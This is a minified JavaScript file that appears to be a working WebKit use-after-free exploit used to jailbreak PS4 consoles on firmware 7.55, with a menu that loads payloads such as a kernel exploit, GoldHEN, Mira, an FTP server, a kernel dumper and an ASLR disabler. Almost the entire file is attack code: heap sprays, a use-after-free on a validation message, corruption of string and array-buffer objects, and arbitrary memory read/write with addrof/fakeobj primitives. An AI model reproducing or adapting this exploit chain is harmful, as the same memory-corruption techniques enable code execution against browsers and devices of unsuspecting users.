function Int64(low,high){var bytes=new Uint8Array(8);if (arguments.length>2||arguments.length==0)throw TypeError("Incorrect number of arguments to constructor");if (arguments.length==2){if (typeof low != 'number'||typeof high != 'number'){throw TypeError("Both arguments must be numbers");}if (low>0xffffffff||high>0xffffffff||low < 0||high < 0){throw RangeError("Both arguments must fit inside a uint32");}low=low.toString(16);for (let i=0;i < 8 - low.length;i++){low="0"+low;}low="0x"+high.toString(16)+ low;}switch (typeof low){case 'number':low='0x'+Math.floor(low).toString(16);case 'string':if (low.substr(0,2)==="0x")low=low.substr(2);if (low.length % 2==1)low='0'+low;var bigEndian=unhexlify(low,8);var arr=[];for (var i=0;i < bigEndian.length;i++){arr[i]=bigEndian[i];}bytes.set(arr.reverse());break;case 'object':if (low instanceof Int64){bytes.set(low.bytes());}else{if (low.length != 8)throw TypeError("Array must have excactly 8 elements.");bytes.set(low);}break;case 'undefined':break;}this.asDouble=function (){if (bytes[7]==0xff && (bytes[6]==0xff||bytes[6]==0xfe))throw new RangeError("Can not be represented by a double");return Struct.unpack(Struct.float64,bytes);};this.asInteger=function (){if (bytes[7] != 0||bytes[6]>0x20){debug_log("SOMETHING BAD HAS HAPPENED!!!");throw new RangeError( "Can not be represented as a regular number");}return Struct.unpack(Struct.int64,bytes);};this.asJSValue=function (){if ((bytes[7]==0 && bytes[6]==0)|| (bytes[7]==0xff && bytes[ 6]==0xff))throw new RangeError( "Can not be represented by a JSValue");return Struct.unpack(Struct.float64,this.sub(0x1000000000000).bytes());};this.bytes=function (){var arr=[];for (var i=0;i < bytes.length;i++){arr.push(bytes[i])}return arr;};this.byteAt=function (i){return bytes[i];};this.toString=function (){var arr=[];for (var i=0;i < bytes.length;i++){arr.push(bytes[i])}return '0x'+hexlify(arr.reverse());};this.low32=function (){return new Uint32Array(bytes.buffer)[0]>>>0;};this.hi32=function (){return new Uint32Array(bytes.buffer)[1]>>>0;};this.equals=function (other){if (!(other instanceof Int64)){other=new Int64(other);}for (var i=0;i < 8;i++){if (bytes[i] != other.byteAt(i))return false;}return true;};this.greater=function (other){if (!(other instanceof Int64)){other=new Int64(other);}if (this.hi32()>other.hi32())return true;else if (this.hi32()===other.hi32()){if (this.low32()>other.low32())return true;}return false;};function operation(f,nargs){return function (){if (arguments.length != nargs)throw Error("Not enough arguments for function "+f.name);var new_args=[];for (var i=0;i < arguments.length;i++){if (!(arguments[i] instanceof Int64)){new_args[i]=new Int64(arguments[i]);}else{new_args[i]=arguments[i];}}return f.apply(this,new_args);};} this.neg=operation(function neg(){var ret=[];for (var i=0;i < 8;i++)ret[i]=~this.byteAt(i);return new Int64(ret).add(Int64.One);},0);this.add=operation(function add(a){var ret=[];var carry=0;for (var i=0;i < 8;i++){var cur=this.byteAt(i)+ a.byteAt(i)+ carry;carry=cur>0xff | 0;ret[i]=cur;}return new Int64(ret);},1);this.assignAdd=operation(function assignAdd(a){var carry=0;for (var i=0;i < 8;i++){var cur=this.byteAt(i)+ a.byteAt(i)+ carry;carry=cur>0xff | 0;bytes[i]=cur;}return this;},1);this.sub=operation(function sub(a){var ret=[];var carry=0;for (var i=0;i < 8;i++){var cur=this.byteAt(i)- a.byteAt(i)- carry;carry=cur < 0 | 0;ret[i]=cur;}return new Int64(ret);},1);} Int64.fromDouble=function (d){var bytes=Struct.pack(Struct.float64,d);return new Int64(bytes);};Int64.Zero=new Int64(0);Int64.One=new Int64(1);Int64.NegativeOne=new Int64(0xffffffff,0xffffffff);function die(msg){alert(msg);undefinedFunction();} function debug_log(msg){document.getElementById("progress").innerHTML=msg;frame1();} function hex(b){return ('0'+b.toString(16)).substr(-2);} function hexlify(bytes){var res=[];for (var i=0;i < bytes.length;i++)res.push(hex(bytes[i]));return res.join('');} function unhexlify(hexstr){if (hexstr.length % 2==1)throw new TypeError("Invalid hex string");var bytes=new Uint8Array(hexstr.length / 2);for (var i=0;i < hexstr.length;i += 2)bytes[i / 2]=parseInt(hexstr.substr(i,2),16);return bytes;} function hexdump(data){if (typeof data.BYTES_PER_ELEMENT !== 'undefined')data=Array.from(data);var lines=[];for (var i=0;i < data.length;i += 16){var chunk=data.slice(i,i+16);var parts=chunk.map(hex);if (parts.length>8)parts.splice(8,0,' ');lines.push(""+i.toString(16)+ " :"+parts.join(' '));}return lines.join('\n');} function buf2hex(buffer){return Array.prototype.map.call(new Uint8Array(buffer),x =>('00'+x.toString(16)).slice(-2)).join('');}var Struct=(function (){var buffer=new ArrayBuffer(8);var byteView=new Uint8Array(buffer);var uint32View=new Uint32Array(buffer);var float64View=new Float64Array(buffer);return{pack:function (type,low,high){var view=type;view[0]=low;return new Uint8Array(buffer,0,type.BYTES_PER_ELEMENT);},unpack:function (type,bytes){if (bytes.length !== type.BYTES_PER_ELEMENT)throw Error("Invalid bytearray");var view=type;byteView.set(bytes);return view[0];},int8:byteView,int32:uint32View,float64:float64View};})();var backingBuffer=new ArrayBuffer(8);var f=new Float32Array(backingBuffer);var i=new Uint32Array(backingBuffer);function i2f(num){i[0]=num;return f[0];} function f2i(num){f[0]=num;return i[0];} function str2array(str,length,offset){if (offset ===undefined)offset=0;var a=new Array(length);for (var i=0;i < length;i++){a[i]=str.charCodeAt(i+offset);}return a;}const OFFSET_ELEMENT_REFCOUNT=0x10;const OFFSET_JSAB_VIEW_VECTOR=0x10;const OFFSET_JSAB_VIEW_LENGTH=0x18;const OFFSET_LENGTH_STRINGIMPL=0x04;const OFFSET_HTMLELEMENT_REFCOUNT=0x14;const LENGTH_ARRAYBUFFER=0x8;const LENGTH_STRINGIMPL=0x14;const LENGTH_JSVIEW=0x20;const LENGTH_VALIDATION_MESSAGE=0x30;const LENGTH_TIMER=0x48;const LENGTH_HTMLTEXTAREA=0xd8;const SPRAY_ELEM_SIZE=0x6000;const SPRAY_STRINGIMPL=0x1000;const NB_FRAMES=0xfa0;const NB_REUSE=0x8000;var g_arr_ab_1=[];var g_arr_ab_2=[];var g_arr_ab_3=[];var g_frames=[];var g_relative_read=null;var g_relative_rw=null;var g_ab_slave=null;var g_ab_index=null;var g_timer_leak=null;var g_jsview_leak=null;var g_jsview_butterfly=null;var g_message_heading_leak=null;var g_message_body_leak=null;var g_textarea_div_elem=null;var g_obj_str ={};var g_rows1='1px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2)+ "1px";var g_rows2='2px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2)+ "2px";var g_round=1;var g_input=null;var guess_htmltextarea_addr=new Int64("0x2031b00d8");function setupRW(){for (let i=0;i < g_arr_ab_3.length;i++){if (g_arr_ab_3[i].length>0xff){g_relative_rw=g_arr_ab_3[i];debug_log("->Succesfully got a relative R/W");break;}}if (g_relative_rw ===null)die("[!] Failed to setup a relative R/W primitive");debug_log("->Setting up arbitrary R/W");let diff=g_jsview_leak.sub(g_timer_leak).low32()- LENGTH_STRINGIMPL+1;let ab_addr=new Int64(str2array(g_relative_read,8,diff+OFFSET_JSAB_VIEW_VECTOR));let ab_index=g_jsview_leak.sub(ab_addr).low32();if (g_relative_rw[ab_index+LENGTH_JSVIEW+OFFSET_JSAB_VIEW_LENGTH] ===LENGTH_ARRAYBUFFER)g_ab_index=ab_index+LENGTH_JSVIEW;else g_ab_index=ab_index - LENGTH_JSVIEW;g_relative_rw[g_ab_index+OFFSET_JSAB_VIEW_LENGTH]=0x41;for (let i=0;i < g_arr_ab_3.length;i++){if (g_arr_ab_3[i].length ===0x41){g_ab_slave=g_arr_ab_3[i];g_arr_ab_3=null;break;}}if (g_ab_slave ===null)die("[!] Didn't found the slave JSArrayBufferView");g_relative_rw[g_ab_index+OFFSET_JSAB_VIEW_LENGTH]=0xff;g_relative_rw[g_ab_index+OFFSET_JSAB_VIEW_LENGTH+1]=0xff;g_relative_rw[g_ab_index+OFFSET_JSAB_VIEW_LENGTH+2]=0xff;g_relative_rw[g_ab_index+OFFSET_JSAB_VIEW_LENGTH+3]=0xff;debug_log("->Testing arbitrary R/W");let saved_vtable=read64(guess_htmltextarea_addr);write64(guess_htmltextarea_addr,new Int64("0x4141414141414141"));if (!read64(guess_htmltextarea_addr).equals("0x4141414141414141"))die("[!] Failed to setup arbitrary R/W primitive");debug_log("->Succesfully got arbitrary R/W!");write64(guess_htmltextarea_addr,saved_vtable);cleanup();g_ab_slave.leakme=0x1337;var bf=0;for(var i=15;i>= 8;i--)bf=256 * bf+g_relative_rw[g_ab_index+i];g_jsview_butterfly=new Int64(bf);if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))die("[!] Failed to setup addrof/fakeobj primitives");if(localStorage.autoExploit=="true")debug_log("->WebKit Exploit Complete.. Running Kernel Exploit !!");else debug_log("->WebKit Exploit Complete.. Running Jailbreak.. Please wait !!");if(window.postExploit)window.postExploit();}
function toggle_payload(pld){
	if(pld == "exploit"){
		document.getElementById("progress").innerHTML="Running Jailbreak.. Please wait!!";
		preloadScripts(['jb.js']);
	}else if(pld == "exploit_old"){
		document.getElementById("progress").innerHTML="Running Jailbreak.. Please wait!!";
		preloadScripts(['oldjb.js']);
	}else if(pld == "binloader"){
		document.getElementById("progress").innerHTML="Awaiting Payload.. Send Payload to port 9020..";
		preloadScripts(['jsloader.js']);
	}else if(pld == "mira75X"){
		document.getElementById("progress").innerHTML="Loading MIRA.. Please wait..";
		if(fw=="755"){
			preloadScripts(['mira'+fw+'.js','jsloader.js']);
		}else{
			preloadScripts(['preloader'+fw+'.js','mira'+fw+'.js','jsloader.js']);	
		}
  }else if(pld == "cache"){
		document.getElementById("progress").innerHTML="Loading Dump cache host.. Please wait..";
		preloadScripts(['cache.js','jsloader.js']);				
	}else if(pld == "Silver755"){
		document.getElementById("progress").innerHTML="Loading Platinum755x82-v1.0b.. Please wait..";
		preloadScripts(['Silver755.js','jsloader.js']);
	}else if(pld == "Silver755x82-1.2"){
		document.getElementById("progress").innerHTML="Loading Platinum755x82-v1.0b-Spoofed.. Please wait..";
		preloadScripts(['Silver755x82-1.2.js','jsloader.js']);	
	}else if(pld == "Silver755x80"){
		document.getElementById("progress").innerHTML="Loading Silver755x80.. Please wait..";
		preloadScripts(['Silver755x80.js','jsloader.js']);		
	}else if(pld == "henSP7"){
		document.getElementById("progress").innerHTML="Loading henSP7.. Please wait..";
		preloadScripts(['henSP7.js','jsloader.js']);
	}else if(pld == "henSP8"){
		document.getElementById("progress").innerHTML="Loading henSP8.. Please wait..";
		preloadScripts(['henSP8.js','jsloader.js']);
	}else if(pld == "mira2b"){
		document.getElementById("progress").innerHTML="Loading MIRA+SPOOF.. Please wait..";
		preloadScripts(['mira2.js','jsloader.js']);
	}else if(pld == "BeefQueefMod133"){
		document.getElementById("progress").innerHTML="Loading Gta 5 BeefQueefMod 1.33.. Please wait..";
		preloadScripts(['BeefQueefMod133.js','jsloader.js']);
	}else if(pld == "backup"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['backup.js','jsloader.js']);		
	}else if(pld == "ftp"){
		setTimeout(function(){document.getElementById("progress").innerHTML="FTP Loaded.. Access at port 1337..";},7000);
		preloadScripts(['ftp.js','jsloader.js']);
	}else if(pld == "app2usb"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['app2usb.js','jsloader.js']);
	}else if(pld == "disableupdates"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['disableupdates.js','jsloader.js']);
	}else if(pld == "enableupdates"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['enableupdates.js','jsloader.js']);
	}else if(pld == "DB_SG_Backup"){
		document.getElementById("progress").innerHTML="Loading DB_SG_Backup.. Please wait..";
		preloadScripts(['DB_SG_Backup.js','jsloader.js']);
	}else if(pld == "restore"){
		document.getElementById("progress").innerHTML="Loading DB_SG_restore.. Please wait..";
		preloadScripts(['DB_SG_restore.js','jsloader.js']);
	}else if(pld == "Orbis-Toolbox-755"){
		document.getElementById("progress").innerHTML="Loading Orbis-Toolbox.. Please wait..";
		preloadScripts(['Orbis-Toolbox-755.js','jsloader.js']);
	}else if(pld == "todex"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['todex.js','jsloader.js']);
	}else if(pld == "kdumper"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['kdumper.js','jsloader.js']);
	}else if(pld == "disableaslr"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['disableaslr.js','jsloader.js']);
	}else if(pld == "rdr2mod124"){
		document.getElementById("progress").innerHTML="Loading Rdr2 Mod Please wait..";
		preloadScripts(['rdr2mod124.js','jsloader.js']);
	}else if(pld == "kernelclock"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['kernelclock.js','jsloader.js']);
	}else if(pld == "fancontrol"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['fancontrol.js','jsloader.js']);
	}else if(pld == "enablebrowser"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['enablebrowser.js','jsloader.js']);
	}else if(pld == "historyblocker"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['historyblocker.js','jsloader.js']);
	}else if(pld == "exitidu"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['exitidu.js','jsloader.js']);
	}else if(pld == "ps4debug"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['ps4debug.js','jsloader.js']);
	}else if(pld == "goldhenold"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		if(fw=="755"){
			preloadScripts(['goldhen'+fw+'.js','jsloader.js']);
		}else{
			preloadScripts(['preloader'+fw+'.js','goldhen'+fw+'.js','jsloader.js']);	
		}
	}else if(pld == "goldhen"){
    document.getElementById("progress").innerHTML="Loading Goldhen-755-1.1.. Please wait..";
		preloadScripts(['Goldhen-755-1.1.js','jsloader.js']);
	}else if(pld == "webrte"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['webrte.js','jsloader.js']);
	}else if(pld == "ps4-dumper-vtx755"){
    document.getElementById("progress").innerHTML="Loading ps4-dumper-vtx755.. Please wait..";
		preloadScripts(['ps4-dumper-vtx755.js','jsloader.js']);
	}else if(pld == "ps4-dumper-1.8"){
		document.getElementById("progress").innerHTML="Loading ps4-dumper-1.8.. Please wait..";
		preloadScripts(['ps4-dumper-1.8.js','jsloader.js']);
	}
	if(window.postPayload)
		window.postPayload();
	payload_finished(pld);
	
}
function payload_finished(payload)
{
	if(payload == "binloader"){
		setTimeout(function(){document.getElementById("progress").innerHTML="Awaiting Payload!! Send Payload To Port 9021";},7000);
	} else if(payload != "exploit" && payload != "exploit_old"){
		setTimeout(function(){document.getElementById("progress").innerHTML="PS4 Jailbreak 7.55 Payload Loaded Succesfully !!";},7000);
	}
}
function read(addr,length){for (let i=0;i < 8;i++)g_relative_rw[g_ab_index+OFFSET_JSAB_VIEW_VECTOR+i]=addr.byteAt(i);let arr=[];for (let i=0;i < length;i++)arr.push(g_ab_slave[i]);return arr;} function read64(addr){return new Int64(read(addr,8));} function write(addr,data){for (let i=0;i < 8;i++)g_relative_rw[g_ab_index+OFFSET_JSAB_VIEW_VECTOR+i]=addr.byteAt(i);for (let i=0;i < data.length;i++)g_ab_slave[i]=data[i];} function write64(addr,data){write(addr,data.bytes());} function addrof(obj){g_ab_slave.leakme=obj;return read64(g_jsview_butterfly.sub(16));} function fakeobj(addr){write64(g_jsview_butterfly.sub(16),addr);return g_ab_slave.leakme;} function cleanup(){select1.remove();select1=null;input1.remove();input1=null;input2.remove();input2=null;input3.remove();input3=null;div1.remove();div1=null;g_input=null;g_rows1=null;g_rows2=null;g_frames=null;} function confuseTargetObjRound2(){if (findTargetObj()===false)die("[!] Failed to reuse target obj.");g_fake_validation_message[4]=g_jsview_leak.add(OFFSET_JSAB_VIEW_LENGTH+5 - OFFSET_HTMLELEMENT_REFCOUNT).asDouble();setTimeout(setupRW,6000);} function leakJSC(){debug_log("->Looking for the smashed StringImpl...");var arr_str=Object.getOwnPropertyNames(g_obj_str);for (let i=arr_str.length - 1;i>0;i--){if (arr_str[i].length>0xff){debug_log("->StringImpl corrupted successfully");g_relative_read=arr_str[i];g_obj_str=null;break;}}if (g_relative_read ===null)die("[!] Failed to setup a relative read primitive");debug_log("->Got a relative read");var tmp_spray ={};for(var i=0;i < 100000;i++)tmp_spray['Z'.repeat(8 * 2 * 8 - 5 - LENGTH_STRINGIMPL)+ (''+i).padStart(5,'0')]=0x1337;let ab=new ArrayBuffer(LENGTH_ARRAYBUFFER);let tmp=[];for (let i=0;i < 0x10000;i++){if (i>= 0xfc00)g_arr_ab_3.push(new Uint8Array(ab));else tmp.push(new Uint8Array(ab));}tmp=null;var props=[];for (var i=0;i < 0x400;i++){props.push({value:0x42424242});props.push({value:g_arr_ab_3[i]});}while (g_jsview_leak ===null){Object.defineProperties({},props);for (let i=0;i < 0x800000;i++){var v=undefined;if (g_relative_read.charCodeAt(i)===0x42 && g_relative_read.charCodeAt(i+0x01)===0x42 && g_relative_read.charCodeAt(i+0x02)===0x42 && g_relative_read.charCodeAt(i+0x03)===0x42){if (g_relative_read.charCodeAt(i+0x08)===0x00 && g_relative_read.charCodeAt(i+0x0f)===0x00 && g_relative_read.charCodeAt(i+0x10)===0x00 && g_relative_read.charCodeAt(i+0x17)===0x00 && g_relative_read.charCodeAt(i+0x18)===0x0e && g_relative_read.charCodeAt(i+0x1f)===0x00 && g_relative_read.charCodeAt(i+0x28)===0x00 && g_relative_read.charCodeAt(i+0x2f)===0x00 && g_relative_read.charCodeAt(i+0x30)===0x00 && g_relative_read.charCodeAt(i+0x37)===0x00 && g_relative_read.charCodeAt(i+0x38)===0x0e && g_relative_read.charCodeAt(i+0x3f)===0x00)v=new Int64(str2array(g_relative_read,8,i+0x20));else if (g_relative_read.charCodeAt(i+0x10)===0x42 && g_relative_read.charCodeAt(i+0x11)===0x42 && g_relative_read.charCodeAt(i+0x12)===0x42 && g_relative_read.charCodeAt(i+0x13)===0x42)v=new Int64(str2array(g_relative_read,8,i+8));}if (v !== undefined && v.greater(g_timer_leak)&& v.sub(g_timer_leak).hi32()===0x0){g_jsview_leak=v;props=null;break;}}}debug_log("->JSArrayBufferView:"+g_jsview_leak);prepareUAF();} function confuseTargetObjRound1(){sprayStringImpl(SPRAY_STRINGIMPL,SPRAY_STRINGIMPL * 2);if (findTargetObj()===false)die("[!] Failed to reuse target obj.");dumpTargetObj();g_fake_validation_message[4]=g_timer_leak.add(LENGTH_TIMER * 8+OFFSET_LENGTH_STRINGIMPL+1 - OFFSET_ELEMENT_REFCOUNT).asDouble();setTimeout(leakJSC,6000);} function handle2(){input2.focus();} function reuseTargetObj(){document.body.appendChild(g_input);for (let i=NB_FRAMES / 2 - 0x10;i < NB_FRAMES / 2+0x10;i++)g_frames[i].setAttribute("rows",',');for (let i=0;i < NB_REUSE;i++){let ab=new ArrayBuffer(LENGTH_VALIDATION_MESSAGE);let view=new Float64Array(ab);view[0]=guess_htmltextarea_addr.asDouble();view[3]=guess_htmltextarea_addr.asDouble();g_arr_ab_1.push(view);}if (g_round==1){sprayStringImpl(0,SPRAY_STRINGIMPL);g_frames=[];g_round += 1;g_input=input3;setTimeout(confuseTargetObjRound1,10);}else{setTimeout(confuseTargetObjRound2,10);}} function dumpTargetObj(){debug_log("->m_timer:"+g_timer_leak);debug_log("->m_messageHeading:"+g_message_heading_leak);debug_log("->m_messageBody:"+g_message_body_leak);} function findTargetObj(){for (let i=0;i < g_arr_ab_1.length;i++){if (!Int64.fromDouble(g_arr_ab_1[i][2]).equals(Int64.Zero)){debug_log("->Found fake ValidationMessage");if (g_round ===2){g_timer_leak=Int64.fromDouble(g_arr_ab_1[i][2]);g_message_heading_leak=Int64.fromDouble(g_arr_ab_1[i][4]);g_message_body_leak=Int64.fromDouble(g_arr_ab_1[i][5]);g_round++;}g_fake_validation_message=g_arr_ab_1[i];g_arr_ab_1=[];return true;}}return false;} function prepareUAF(){g_input.setCustomValidity("ps4");for (let i=0;i < NB_FRAMES;i++){var element=document.createElement("frameset");g_frames.push(element);}g_input.reportValidity();var div=document.createElement("div");document.body.appendChild(div);div.appendChild(g_input);for (let i=0;i < NB_FRAMES / 2;i++)g_frames[i].setAttribute("rows",g_rows1);g_input.reportValidity();for (let i=NB_FRAMES / 2;i < NB_FRAMES;i++)g_frames[i].setAttribute("rows",g_rows2);g_input.setAttribute("onfocus","reuseTargetObj()");g_input.autofocus=true;} function sprayHTMLTextArea(){debug_log("->Spraying HTMLTextareaElement ...");let textarea_div_elem=g_textarea_div_elem=document.createElement("div");document.body.appendChild(textarea_div_elem);textarea_div_elem.id="div1";var element=document.createElement("textarea");element.style.cssText='display:block-inline;height:1px;width:1px;visibility:hidden;';for (let i=0;i < SPRAY_ELEM_SIZE;i++)textarea_div_elem.appendChild(element.cloneNode());} function sprayStringImpl(start,end) {let f= (LENGTH_TIMER - LENGTH_STRINGIMPL - 5);let i = start;for (i;i < end;i++){g_obj_str["A".repeat(f) + i.toString().padStart(5,"0")] = 0x1337;}} function go(){sprayHTMLTextArea();if(window.midExploit)window.midExploit();g_input=input1;prepareUAF();}setTimeout("Int64",75000);